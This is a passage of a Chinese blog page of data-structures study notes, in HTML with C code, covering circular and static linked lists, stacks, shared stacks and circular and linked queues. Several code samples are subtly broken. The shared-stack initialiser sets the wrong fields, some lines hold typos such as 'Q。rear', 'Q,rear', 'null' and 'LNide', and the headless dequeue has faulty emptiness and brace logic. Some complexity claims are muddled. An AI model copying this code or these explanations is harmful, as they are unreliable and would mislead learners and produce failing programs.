class="comment">//判断结点p是否为循环单链表的表尾结点</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isTail</span><span class="params">(LinkList L,LNide *p)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;next==L)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>循环单链表可以从任意一个点出发找到任何一个结点</p>
<p>应用场景：在项目中需要经常对表头和表尾进行操作</p>
<h3 id="循环双链表"><a href="#循环双链表" class="headerlink" title="循环双链表"></a>循环双链表</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519202518705.png" alt="image-20220519202518705"></p>
<h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h4><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519202611055.png" alt="image-20220519202611055"></p>
<p>示意图</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519202626494.png" alt="image-20220519202626494"></p>
<p>判空</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519202646358.png" alt="image-20220519202646358"></p>
<p>寻找表尾</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519202653076.png" alt="image-20220519202653076"></p>
<h2 id="静态链表"><a href="#静态链表" class="headerlink" title="静态链表"></a>静态链表</h2><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><p>分配一整片连续的内存空间，各个结点集中安置</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519204020786.png" alt="image-20220519204020786"></p>
<p>游标为-1表示以及到达表尾</p>
<p>游标充当指针</p>
<p>计算：每个数据元素4B，每个游标4B，设起始地址为addr，e1的地址为：</p>
<script type="math/tex; mode=display">
addr+8B*2</script><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10   <span class="comment">//静态链表最大长度</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span>     <span class="comment">//静态链表结构类型的定义</span></span><br><span class="line">    ElemType data;   <span class="comment">//存放数据元素</span></span><br><span class="line">    <span class="type">int</span> next;        <span class="comment">//下一个元素的数组下标</span></span><br><span class="line">&#125;SLinkList[MaxSize];</span><br><span class="line"></span><br><span class="line"><span class="comment">//等价</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="type">int</span> next;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> <span class="title">SLinkList</span>[<span class="title">MaxSize</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">testSLinkList</span><span class="params">()</span>&#123;</span><br><span class="line">    SLinkList a;    <span class="comment">//a看起来是一个静态链表</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//等价</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">testSLinkList</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> <span class="title">a</span>[<span class="title">MaxSize</span>];</span>  <span class="comment">//a看起来是一个node型数组</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="初始化-1"><a href="#初始化-1" class="headerlink" title="初始化"></a>初始化</h3><p>将a[0]的next设置为-1</p>
<h3 id="查找-1"><a href="#查找-1" class="headerlink" title="查找"></a>查找</h3><p>从头结点出发遍历结点</p>
<p>时间复杂度为O(n)</p>
<h3 id="插入-2"><a href="#插入-2" class="headerlink" title="插入"></a>插入</h3><p>(1)找到一个空的结点，存入数据元素</p>
<p>(2)从头结点出发找到位序为i-1的结点</p>
<p>(3)修改新结点的next</p>
<p>(4)修改i-号结点的next</p>
<p>如何判断为空？————可以让next设置为特殊值</p>
<h3 id="删除-2"><a href="#删除-2" class="headerlink" title="删除"></a>删除</h3><p>(1)从头结点出发找到前驱结点</p>
<p>(2)修改前驱结点的游标</p>
<p>(3)被删除的结点next设为-2</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>静态链表：用数组的方式实现的链表</p>
<p>逻辑上相邻的元素可以在物理上不相邻</p>
<p>优点：增删操作不需要大量移动元素</p>
<p>缺点：不能随机存取，固定容量不可变</p>
<p>使用场景：不支持指针的低级语言。数据元素数量固定不变的场景（操作系统的文件分配表）</p>
<h2 id="顺序表和链表的比较"><a href="#顺序表和链表的比较" class="headerlink" title="顺序表和链表的比较"></a>顺序表和链表的比较</h2><h3 id="逻辑结构-1"><a href="#逻辑结构-1" class="headerlink" title="逻辑结构"></a>逻辑结构</h3><p>都属于线性表，都是线性结构</p>
<h3 id="存储结构-1"><a href="#存储结构-1" class="headerlink" title="存储结构"></a>存储结构</h3><p><strong>顺序表</strong>   优点：支持随机存取，存储密度高</p>
<p>​              缺点：大片连续空间分配不方便，改变容量不方便</p>
<p><strong>链表</strong>       优点：离散的小空间分配方便，改变不容量方便</p>
<p>​               缺点：不可随机存取，存储密度低</p>
<h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p>创销 增删改查</p>
<h4 id="创"><a href="#创" class="headerlink" title="创"></a>创</h4><p>顺序表：预分配大片连续空间。静态分配：静态数组（空间大小不可改变）。动态分配：动态数组（malloc，free函数，但需要大量移动数据）</p>
<p>链表：只需分配一个头结点（或者头指针）</p>
<h4 id="销"><a href="#销" class="headerlink" title="销"></a>销</h4><p>顺序表：修改length=0，静态数组：系统自动回收空间。动态数组：需要手动free</p>
<p>链表：一次删除各个结点（free）</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519211257486.png" alt="image-20220519211257486"></p>
<h4 id="增，删"><a href="#增，删" class="headerlink" title="增，删"></a>增，删</h4><p>顺序表：移动元素，时间复杂度O(n),时间花销主要来自移动元素</p>
<p>链表：修改指针，时间复杂度O(n),时间花销来自查找目标元素</p>
<p>链表的效率比顺序表高得多</p>
<h4 id="查"><a href="#查" class="headerlink" title="查"></a>查</h4><p>顺序表：按位查找：O(1)</p>
<p>​              按位查找：O(n)，若表内元素有序，可在</p>
<script type="math/tex; mode=display">
O(log_2n)</script><p>时间内找到</p>
<p>链表: 按位查找：O(n)</p>
<p>​         按值查找：O(n)</p>
<p>顺序表效率更好</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519212208066.png" alt="image-20220519212208066"></p>
<h4 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h4><p>表长难以预估，经常要增加/删除元素 ——链表</p>
<p>表长可以预估，查询（搜索）操作较多  ——顺序表</p>
<h3 id="开放式问题的答题思路"><a href="#开放式问题的答题思路" class="headerlink" title="开放式问题的答题思路"></a>开放式问题的答题思路</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220519212403852.png" alt="image-20220519212403852"></p>
<h1 id="第三章——栈和队列"><a href="#第三章——栈和队列" class="headerlink" title="第三章——栈和队列"></a>第三章——栈和队列</h1><h2 id="栈的定义"><a href="#栈的定义" class="headerlink" title="栈的定义"></a>栈的定义</h2><p>栈（stack）是值允许在一端进行插入或者删除操作的线性表</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220602162636874.png" alt="image-20220602162636874" style="zoom:50%;"></p>
<h3 id="重要术语"><a href="#重要术语" class="headerlink" title="重要术语"></a>重要术语</h3><p>空栈，栈顶 ，栈底<img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220602162853052.png" alt="image-20220602162853052"></p>
<p>逻辑结构：与普通线性表相同</p>
<h3 id="栈的基本操作"><a href="#栈的基本操作" class="headerlink" title="栈的基本操作"></a>栈的基本操作</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220602163140637.png" alt="image-20220602163140637"></p>
<p>进栈和出栈</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220602163335955.png" alt="image-20220602163335955" style="zoom:80%;"></p>
<h2 id="顺序栈的实现"><a href="#顺序栈的实现" class="headerlink" title="顺序栈的实现"></a>顺序栈的实现</h2><h3 id="初始化和判空"><a href="#初始化和判空" class="headerlink" title="初始化和判空"></a>初始化和判空</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10                  <span class="comment">//定义栈中元素的最大个数</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    ElemType data[MaxSize];         <span class="comment">//静态数组存放栈中元素</span></span><br><span class="line">    <span class="type">int</span> top;                        <span class="comment">//栈顶指针</span></span><br><span class="line">&#125; SqStack;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化栈</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitStack</span><span class="params">(SqStack &amp;S)</span>&#123;</span><br><span class="line">    S.top=<span class="number">-1</span>;                        <span class="comment">//初始化栈顶指针         </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//因为初始化是s.top=-1</span></span><br><span class="line"><span class="comment">//判断栈空</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">StackEmpty</span><span class="params">(SqStack S)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top==<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">testStack</span><span class="params">()</span>&#123;</span><br><span class="line">	SqStack S;   <span class="comment">//声明一个顺序栈（分配空间）</span></span><br><span class="line">    <span class="comment">//..后续操作。。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>顺序存储：给各个数据元素分配连续的存储空间，大小为MaxSize*sizeof(ElemType)</p>
<h3 id="进栈操作"><a href="#进栈操作" class="headerlink" title="进栈操作"></a>进栈操作</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">Push</span><span class="params">(SqStack &amp;S,ElemType x)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(S.top==MaxSize<span class="number">-1</span>)   <span class="comment">//栈满报错</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    S.top = S.top+<span class="number">1</span>;        <span class="comment">//指针+1</span></span><br><span class="line">    S.data[S.top]=x;        <span class="comment">//新元素入栈       //替换为S.data[++S.top]=x;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="出栈和读栈顶元素操作"><a href="#出栈和读栈顶元素操作" class="headerlink" title="出栈和读栈顶元素操作"></a>出栈和读栈顶元素操作</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//出栈操作</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">Pop</span><span class="params">(SqStack &amp;S,ElemType &amp;x)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top == <span class="number">-1</span>)          <span class="comment">//栈空报错</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    x=S.data[S.top];</span><br><span class="line">    S.top = S.top <span class="number">-1</span>;        <span class="comment">//x=S.data[S.top--]</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//读栈顶元素</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">GetTop</span><span class="params">(SqStack S,ElemType &amp;x)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    x = S.data[S.top];</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>top = 0时，栈满时top=maxsize=10</p>
<p>top = -1时，栈满是top=9</p>
<p>二者的入栈出栈操作正好是翻过来</p>
<h3 id="共享栈"><a href="#共享栈" class="headerlink" title="共享栈"></a>共享栈</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10              <span class="comment">//定义栈中元素的最大个数</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	ElemType data[MaxSize];     <span class="comment">//静态数组存放栈中元素</span></span><br><span class="line">    <span class="type">int</span> top0;                   <span class="comment">//0号栈栈顶指针</span></span><br><span class="line">    <span class="type">int</span> top1;                   <span class="comment">//一号栈栈顶指针</span></span><br><span class="line">&#125;ShStack;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化栈</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitStack</span><span class="params">(ShStack &amp;S)</span>&#123;</span><br><span class="line">    S.top=<span class="number">-1</span>;                   <span class="comment">//初始化栈顶指针</span></span><br><span class="line">    S.top=MaxSize;</span><br><span class="line">&#125;                              <span class="comment">//栈满的条件：top0 + 1 == top1</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603162012226.png" alt="image-20220603162012226" style="zoom: 50%;"></p>
<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603161547608.png" alt="image-20220603161547608"></p>
<h2 id="链栈"><a href="#链栈" class="headerlink" title="链栈"></a>链栈</h2><p>用链式存储的栈也是一种单链表，只是在插入和删除进行了限制，例如头插法就是入栈，删除第一个结点就是出栈</p>
<h3 id="链栈的定义"><a href="#链栈的定义" class="headerlink" title="链栈的定义"></a>链栈的定义</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Linknode</span>&#123;</span></span><br><span class="line">    ElemType data;              <span class="comment">//数据域</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Linknode</span> *<span class="title">next</span>;</span>      <span class="comment">//指针域</span></span><br><span class="line">&#125; *LiStack;                     <span class="comment">//栈类型定义</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603162308266.png" alt="image-20220603162308266"></p>
<h2 id="队列（Queue）"><a href="#队列（Queue）" class="headerlink" title="队列（Queue）"></a>队列（Queue）</h2><h3 id="队列的定义"><a href="#队列的定义" class="headerlink" title="队列的定义"></a>队列的定义</h3><p>只允许在一端插入，在另一端删除的线性表</p>
<p>入队：插入     eg：打饭，高速过闸口</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603163038483.png" alt="image-20220603163038483"></p>
<p>插入的一段为队尾，删除的一端为队头</p>
<p>队列的特点：先进先出（First In First Out)(FIFO)</p>
<p>栈的特点：后进先出（LIFO）</p>
<h3 id="基本操作-1"><a href="#基本操作-1" class="headerlink" title="基本操作"></a>基本操作</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603163231846.png" alt="image-20220603163231846"></p>
<h2 id="队列的顺序存储结构"><a href="#队列的顺序存储结构" class="headerlink" title="队列的顺序存储结构"></a>队列的顺序存储结构</h2><h3 id="队列的顺序实现-初始化和判空操作"><a href="#队列的顺序实现-初始化和判空操作" class="headerlink" title="队列的顺序实现,初始化和判空操作"></a>队列的顺序实现,初始化和判空操作</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    Elemtype data[MaxSize];     <span class="comment">//静态数组存放队列元素</span></span><br><span class="line">    <span class="type">int</span> front,rear;             <span class="comment">//队头队尾指针</span></span><br><span class="line">&#125; SqQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitQueue</span><span class="params">(SqQueue &amp;Q)</span>&#123;</span><br><span class="line">    Q.front = Q.rear =<span class="number">0</span>;    <span class="comment">//初始时 队头队尾指针指向0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判空操作</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">QueueEmpty</span><span class="params">(SqQueue Q)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.rear == Q.front)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">testQueue</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//声明一个队列（顺序存储）</span></span><br><span class="line">    SqQueue Q;</span><br><span class="line">    <span class="comment">//。。。后续操作。。。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="入队操作"><a href="#入队操作" class="headerlink" title="入队操作"></a>入队操作</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">EnQueue</span><span class="params">(SqQueue &amp;Q,ElemType x)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>((Q.rear+<span class="number">1</span>)%MaxSize==Q.front )</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;               <span class="comment">//队满报错</span></span><br><span class="line">    Q.data[Q.rear] = x;               <span class="comment">//新元素插入队尾</span></span><br><span class="line">    Q.rear = (Q.rear + <span class="number">1</span>)%MaxSize;    <span class="comment">//队尾指针加1取模</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="出队操作和查询队头操作"><a href="#出队操作和查询队头操作" class="headerlink" title="出队操作和查询队头操作"></a>出队操作和查询队头操作</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">DeQueue</span><span class="params">(SqQueue &amp;Q,Elemtype &amp;x)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.rear == Q.front)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    x = Q.data[Q.front];</span><br><span class="line">    Q.front =(Q.front+<span class="number">1</span>)%MaxSize;   <span class="comment">//删除这一句后就是查询队头操作</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="判断队列已满-已空-元素个数"><a href="#判断队列已满-已空-元素个数" class="headerlink" title="判断队列已满/已空/元素个数"></a>判断队列已满/已空/元素个数</h3><p>元素个数：（rear+MaxSize-front)%MaxSize</p>
<p>方案一：</p>
<p>已满：(Q.rear+1)%MaxSize==Q.front</p>
<p>已空：Q.rear == Q.front</p>
<p>方案二：</p>
<p>增加一个变量 int size  插入成功 size++ 删除成功size — 初始化  size=0</p>
<p>队满条件：size==MaxSize    队空条件：size ==0</p>
<p>方案三：</p>
<p>增加一个变量tag（最近进行的是删除赋值为0，插入赋值为1，初始化tag=0）</p>
<p>原理：只有删除操作才可能导致队空，只有插入操作才可能导致队满</p>
<p>队满条件：front==rear&amp;&amp;tag=1 </p>
<p>队空条件：front==rear&amp;&amp;tag=0</p>
<h3 id="其他出题方法"><a href="#其他出题方法" class="headerlink" title="其他出题方法"></a>其他出题方法</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603170120078.png" alt="image-20220603170120078"></p>
<p>初始化的时候设置rear=MaxSize-1 front=0</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603170229143.png" alt="image-20220603170229143" style="zoom: 67%;"><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/Users\18251\AppData\Roaming\Typora\typora-user-images\image-20220603170342160.png" alt="image-20220603170342160" style="zoom: 67%;"></p>
<p>判空：方案一：牺牲一个存储单元</p>
<p>​           方案二：设置变量tag或size</p>
<h2 id="队列的链式存储结构"><a href="#队列的链式存储结构" class="headerlink" title="队列的链式存储结构"></a>队列的链式存储结构</h2><h3 id="链式实现及初始化"><a href="#链式实现及初始化" class="headerlink" title="链式实现及初始化"></a>链式实现及初始化</h3><h4 id="带头结点"><a href="#带头结点" class="headerlink" title="带头结点"></a>带头结点</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span>&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LinkNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LinkNode;  </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    LinkNode *front,*rear;</span><br><span class="line">&#125;LinkQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitQueue</span><span class="params">(LinkQueue &amp;Q)</span>&#123;</span><br><span class="line">    <span class="comment">//初始时front，rear都指向头结点</span></span><br><span class="line">    Q.front=Q.rear=(LinkNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkNode));</span><br><span class="line">    Q.front-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判空</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">IsEmpty</span><span class="params">(LinkQueue Q)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front==Q.rear)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">testLinkQueue</span><span class="params">()</span>&#123;</span><br><span class="line">    LinkQueue Q;</span><br><span class="line">    InitQueue(Q);</span><br><span class="line">    <span class="comment">//后续操作</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603171845086.png" alt="image-20220603171845086" style="zoom: 67%;"></p>
<h4 id="不带头结点"><a href="#不带头结点" class="headerlink" title="不带头结点"></a>不带头结点</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitQueue</span><span class="params">(LinkQueue &amp;Q)</span>&#123;</span><br><span class="line">    Q.front=<span class="literal">NULL</span>;</span><br><span class="line">    Q.rear=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判空</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">IsEmpty</span><span class="params">(LinkQueue Q)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603172140271.png" alt="image-20220603172140271" style="zoom:80%;"></p>
<h3 id="入队"><a href="#入队" class="headerlink" title="入队"></a>入队</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//新元素入队（带头结点）</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">EnQueue</span><span class="params">(LinkQueue &amp;Q,ElemType x)</span>&#123;</span><br><span class="line">    LinkNode *s=(LinkNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkNode));</span><br><span class="line">    s-&gt;data=x;</span><br><span class="line">    s-&gt;next=null;</span><br><span class="line">    Q.rear-&gt;next=s;     <span class="comment">//新结点插入到rear之后</span></span><br><span class="line">    Q.rear=s;           <span class="comment">//修改rear指针</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//新元素入队（不带头结点）</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">EnQueue</span><span class="params">(LinkQueue &amp;Q,ElemType x)</span>&#123;</span><br><span class="line">    LinkNode *s=(LinkNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkNode));</span><br><span class="line">    s-&gt;data=x;</span><br><span class="line">    s-&gt;next=null;</span><br><span class="line">    <span class="keyword">if</span> (Q.front == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        Q.front = s;</span><br><span class="line">        Q。rear = s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        Q.rear-&gt;next = s;</span><br><span class="line">        Q,rear = s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="出队"><a href="#出队" class="headerlink" title="出队"></a>出队</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//队头元素出队（带头结点）</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">DeQueue</span><span class="params">(LinkQueue &amp;Q,ElemType &amp;x)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front==Q.rear)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;               <span class="comment">//空队</span></span><br><span class="line">    LinkNode *p=Q.front-&gt;next;</span><br><span class="line">    x=p-&gt;data;                      <span class="comment">//变量x返回头元素</span></span><br><span class="line">    Q.front-&gt;next=p-&gt;next;          <span class="comment">//修改头结点的next指针</span></span><br><span class="line">    <span class="keyword">if</span>(Q.rear==p)                   <span class="comment">//最后一个结点出队</span></span><br><span class="line">        Q.rear=Q.front;             <span class="comment">//修改rear指针</span></span><br><span class="line">    <span class="built_in">free</span>(p);                        <span class="comment">//释放节点空间</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//队头元素出队（不带头结点）</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">DeQueue</span><span class="params">(LinkQueue &amp;Q,ElemType &amp;x)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front==Q.rear)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;               <span class="comment">//空队</span></span><br><span class="line">    LinkNode *p=Q.front;</span><br><span class="line">    x=p-&gt;data;                      <span class="comment">//变量x返回头元素</span></span><br><span class="line">    Q.front=p-&gt;next;          <span class="comment">//修改头结点的next指针</span></span><br><span class="line">    <span class="keyword">if</span>(Q.rear==p)                   <span class="comment">//最后一个结点出队</span></span><br><span class="line">        Q.rear=null;              <span class="comment">//front指向null</span></span><br><span class="line">        Q.front=null;             <span class="comment">//修改rear指针指向NULL</span></span><br><span class="line">    <span class="built_in">free</span>(p);                        <span class="comment">//释放节点空间</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="队列满的情况"><a href="#队列满的情况" class="headerlink" title="队列满的情况"></a>队列满的情况</h3><p>链式存储——一般不会队满，除非内存不足</p>
